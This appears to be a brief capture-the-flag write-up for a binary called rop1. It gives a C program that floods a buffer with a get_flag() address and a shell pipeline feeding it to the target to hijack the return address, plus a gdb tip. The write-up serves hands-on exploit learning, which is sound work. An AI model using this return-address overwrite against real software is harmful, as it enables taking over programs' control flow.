Used this C program to push the overwriting instruction into a buffer:

main()
{
int i=0; char buf[44]; //length of char buffer is 32, I just overflowed excess to make sure to get to ret
for (i=0;i<=40;i+=4)
*(long *) &buf[i] = 0x80484cb; // <-- address of get_flag() method
puts(buf);
}

Saved it as ret.c compiled to ret

Then ran (./ret;cat) | ./rop1 //binary executable to overflow

gdb is very useful for viewing addresses (use gdb program, then disas function)
